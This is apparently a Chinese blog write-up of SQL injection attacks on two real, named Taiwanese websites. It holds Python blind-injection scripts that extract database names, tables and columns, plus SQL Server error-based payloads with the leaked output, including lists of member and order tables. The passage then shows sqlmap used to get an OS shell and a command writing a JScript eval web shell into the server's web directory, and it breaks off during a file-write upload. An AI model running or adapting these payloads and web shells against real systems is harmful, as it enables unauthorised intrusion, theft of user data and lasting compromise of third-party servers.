title="延时盲注"></a>延时盲注</h4><p>页面正常回显。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; and if(length(database())&#x3D;13,1,0)-- </span><br></pre></td></tr></table></figure><h4 id="延时注入POC"><a href="#延时注入POC" class="headerlink" title="延时注入POC"></a>延时注入POC</h4><h5 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_len</span>(<span class="params">url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;开始判断数据库的长度————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    max_length=<span class="number">15</span></span><br><span class="line">    database_length=harf_find(min_length,max_length,url)</span><br><span class="line">    print(<span class="string">&quot;数据库的长度为：&quot;</span>+str(database_length))</span><br><span class="line">    print(<span class="string">&quot;数据库长度判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        print(mid_value)</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(length(database())&gt;%d,1,0)--+&quot;</span>%mid_value</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line"><span class="comment">#        time.sleep(10)</span></span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    database_length_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(length(database())&gt;%d,1,0)--+&quot;</span></span><br><span class="line">    get_database_len(database_length_url)</span><br></pre></td></tr></table></figure><h5 id="判断数据库名字"><a href="#判断数据库名字" class="headerlink" title="判断数据库名字"></a>判断数据库名字</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_data</span>(<span class="params">url,database_length,payload</span>):</span></span><br><span class="line">    database_name=<span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;开始判断数据库的名字————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    max_length=<span class="number">126</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,database_length):</span><br><span class="line">        payload=<span class="string">&quot;&#x27; and if(ascii(substr(database(),%d,1))&gt;&quot;</span>%i</span><br><span class="line">        database_name+=chr(harf_find(min_length,max_length,url,payload))</span><br><span class="line">    print(<span class="string">&quot;数据库的名字为：&quot;</span>+database_name)</span><br><span class="line">    print(<span class="string">&quot;数据库名字判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url,payload</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890%s%d,1,0)--+&quot;</span>%(payload,mid_value)</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    database_data_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&quot;</span></span><br><span class="line">    payload=<span class="string">&quot;&#x27; and if(ascii(substr(database(),%d,1))&gt;&quot;</span></span><br><span class="line">    database_length=<span class="number">13</span></span><br><span class="line">    get_database_data(database_data_url,database_length,payload)</span><br></pre></td></tr></table></figure><h5 id="判断表的长度"><a href="#判断表的长度" class="headerlink" title="判断表的长度"></a>判断表的长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf_analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//head/title/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span>(<span class="params">url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;开始判断表的长度————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    max_length=<span class="number">15</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(min_length,max_length):</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)=%d,1,0)--+&quot;</span>%i</span><br><span class="line">        table_length=harf_find(min_length,max_length,url)</span><br><span class="line">    print(<span class="string">&quot;表的长度为：&quot;</span>+str(table_length))</span><br><span class="line">    print(<span class="string">&quot;表的长度判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    table_length_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)=&#123;&#125;,1,0)--+&quot;</span></span><br><span class="line">    get_table_length(table_length_url)</span><br></pre></td></tr></table></figure><p>判断表的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断列的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(column_name) from information_schema.columns where table_name = test limit 0,1)=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断列的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name = test limit 0,1),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><h5 id="判断字段的长度"><a href="#判断字段的长度" class="headerlink" title="判断字段的长度"></a>判断字段的长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(user) from test)=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断字段的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select user from test),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Exp2"><a href="#Exp2" class="headerlink" title="Exp2"></a>Exp2</h2><p>数据库为sqlserver</p><h3 id="判断字符、数字型、闭合方式-1"><a href="#判断字符、数字型、闭合方式-1" class="headerlink" title="判断字符、数字型、闭合方式"></a>判断字符、数字型、闭合方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Microsoft OLE DB Provider <span class="keyword">for</span> SQL Server 错误 <span class="string">&#x27;80040e14&#x27;</span></span><br><span class="line"></span><br><span class="line">遗漏字元字串 <span class="string">&#x27; AND 显示状态Flag = 1 ORDER BY 排序 DESC &#x27;</span> 后面的引号。</span><br><span class="line"></span><br><span class="line">D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\../../../_sysadm/_Function/DB_Function.asp, 列<span class="number">158</span></span><br></pre></td></tr></table></figure><p>数字型。</p><p>判断是否是DBA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select is_srvrolemember(&#39;sysadmin&#39;))</span><br><span class="line">select is_srvrolemember(&#39;sysadmin&#39;) </span><br></pre></td></tr></table></figure><h3 id="判断是否是站库分离"><a href="#判断是否是站库分离" class="headerlink" title="判断是否是站库分离"></a>判断是否是站库分离</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select host_name()))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;RENHAI&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select @@servername))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;RENHAI&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><p>主机名和服务器名一样，不是站库分离。</p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1=convert(int,(db_name()))  <span class="comment">#获取当前数据库名</span></span><br><span class="line"></span><br><span class="line">1=convert(int,(@@version))  <span class="comment">#获取数据库版本</span></span><br><span class="line"></span><br><span class="line">1=convert(int,(<span class="keyword">select</span> <span class="keyword">quotename</span>(<span class="keyword">name</span>) <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">&#x27;&#x27;</span>))) <span class="comment">#一次性获取全部数据库</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span> <span class="string">&#x27;|&#x27;</span>%<span class="number">2</span>bname%<span class="number">2</span>b<span class="string">&#x27;|&#x27;</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">&#x27;&#x27;</span>)))  <span class="comment">#一次性获取全部数据库</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select &#39;|&#39; name &#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;|master||tempdb||model||msdb||RenHai||RenHai2012||Renhai_LightSite||RenhaiDevelop||RenHai2012_bak|&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="USER信息"><a href="#USER信息" class="headerlink" title="USER信息"></a>USER信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;)) #查看是否为db_owner权限、sysadmin、public （未测试成功）如果正确则正常，否则报错</span><br><span class="line"></span><br><span class="line">1&#x3D;convert(int,(user)) #查看连接数据库的用户</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;public&#39;))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><p>返回正常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可能是 BOF 或 EOF 的值为 True，或目前的资料录已被删除。所要求的操作需要目前的资料录。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(user))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;dbo&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select quotename(name) from RenHai..sysobjects where xtype&#x3D;&#39;U&#39; FOR XML PATH(&#39;&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将nvarchar 值&#39;[参数表][_WebVisitData][活动相簿主档][活动相簿分类][活动相簿内容][comd_list][D99_CMD][D99_Tmp][comdlist][jiaozhu][职称][订单明细暂存档][会员资料表][订单主档][订单明细档][登入纪录档][产品资料表][sysdiagrams][网站流量][系统设定档][sqlmapoutput][订单暂存档][流水号资料表][订单分类档][单位][订单状态档][太岁表][点灯位置资料表][性别表][庙宇资料表][一般分类][人员][公司基本资料] [人员权限][单位权限][权限][新闻][程式][dtproperties]&#39; 转换成资料类型int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><h5 id="获取注入点的表中的列名"><a href="#获取注入点的表中的列名" class="headerlink" title="获取注入点的表中的列名"></a>获取注入点的表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 having 1&#x3D;1 --&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">资料行 &#39;新闻.流水号&#39; 在选取清单中无效，因为它并未包含在汇总函式或 GROUP BY 子句中。</span><br></pre></td></tr></table></figure><h5 id="获取任意表中的列名"><a href="#获取任意表中的列名" class="headerlink" title="获取任意表中的列名"></a>获取任意表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select * from RenHai..comd_list  where id&#x3D;(select max(id) from test..sysobjects where xtype&#x3D;&#39;u&#39; and name&#x3D;&#39;comd_list&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><h6 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264%20and%201&#x3D;(select%20is_srvrolemember(%27sysadmin%27))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><p>返回正常</p><p>sqlmap一把梭。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; -p p0 --os-shell</span><br></pre></td></tr></table></figure><p>根据之前爆出的路径，尝试写入shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;</span><br><span class="line">os-shell&gt; echo &#39;&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&#39;&gt;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady2.aspx</span><br></pre></td></tr></table></figure><p>回显太慢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; echo &#39;&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&#39;&gt;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady2.aspx</span><br><span class="line">do you want to retrieve the command standard output? [Y&#x2F;n&#x2F;a] y</span><br><span class="line">[14:13:34] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#39;--no-cast&#39; or switch &#39;--hex&#39;</span><br><span class="line">[14:13:34] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval</span><br><span class="line">[14:13:34] [INFO] retrieved:</span><br><span class="line">[14:13:35] [WARNING] time-based comparison requires larger statistical model, please wait..................... (done)</span><br><span class="line">[14:13:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions</span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y&#x2F;n] y</span><br><span class="line">2</span><br><span class="line">[14:13:58] [INFO] retrieved:</span><br><span class="line">[14:13:59] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)</span><br><span class="line">[14:14:14] [INFO] adjusting time delay to 2 seconds due to good response times</span><br><span class="line">這</span><br></pre></td></tr></table></figure><p>直接尝试sqlmap的–file选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; --file-write&#x3D;&quot;&#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;漏洞盒子&#x2F;shell&#x2F;apsx马&#x2F;asp小马&#x2F;2.aspx&quot; 